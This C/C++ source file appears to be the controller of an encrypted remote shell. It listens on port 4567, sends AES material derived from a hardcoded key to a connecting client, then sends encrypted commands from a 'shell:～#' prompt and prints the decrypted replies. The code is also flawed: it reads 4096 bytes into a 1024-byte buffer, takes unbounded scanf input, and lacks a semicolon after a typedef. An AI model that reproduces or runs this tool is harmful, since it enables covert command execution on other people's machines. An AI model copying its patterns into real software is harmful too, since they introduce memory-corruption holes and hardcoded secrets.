#ifndef __WIN32
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#else
#include <winsock2.h>
typedef int socklen_t
#pragma comment(lib, "ws2_32.lib")
#endif
#include <string.h>
#include <stdio.h>
#include <iostream>
#include "FunSer.h"

int main()
{
    int fd;
#ifndef __WIN32
    socklen_t sock_len;
#else
    int sock_len;
    WSADATA wsaData;
    if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("初始化失败！");
        return 0;
    }
#endif
    sockaddr_in serverAddr, clientAddr;
    sock_len = sizeof(clientAddr);
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1)
    {
        printf("创建失败！");
        return 0;
    }
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4567);

#ifndef __WIN32
    serverAddr.sin_addr.s_addr = INADDR_ANY;
#else
    serverAddr.sin_addr.S_un.S_addr = INADDR_ANY;
#endif
    bind(fd, (sockaddr *)&serverAddr, sizeof(serverAddr));
    listen(fd, 20);
    int client = accept(fd, (sockaddr *)&clientAddr, (socklen_t *)&sock_len);
    
    char strmsg[1024];
    char buffer[1024];
    int len;

    recv(client, strmsg, 1024, 0);
    printf("%s\n", strmsg);
    AES aes((unsigned char *)"tiamtian");
    send(client, aes.temp, 1024, 0);

    while(1)
    {   
        printf("shell:～#");
        scanf("%s", buffer);
        if(strcmp(buffer, "exit") == 0)
        {
            return 0;
        }
        len = strlen(buffer);
        aes.Cipher((void *)buffer);
        send(client, buffer, 1024, 0);
    
        recv(client, strmsg, 4096, 0);
        aes.InvCipher((void *)strmsg, 100);
        printf("%s", strmsg);
    }
#ifndef __WIN32
    close(client);
    close(fd);
#else
    closesocket(client);
    closesocket(fd);
    WSACleanup();
#endif
    return 0;
}